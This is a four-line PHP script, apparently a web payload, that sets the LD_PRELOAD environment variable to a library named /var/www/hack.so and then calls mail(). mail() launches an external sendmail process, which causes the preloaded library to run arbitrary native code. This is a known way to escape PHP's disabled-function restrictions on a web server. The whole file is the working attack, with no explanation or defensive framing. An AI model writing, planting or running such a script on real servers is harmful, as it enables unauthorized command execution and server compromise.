<?php
putenv("LD_PRELOAD=/var/www/hack.so");
mail("a@localhost", "", "", "", "");
?>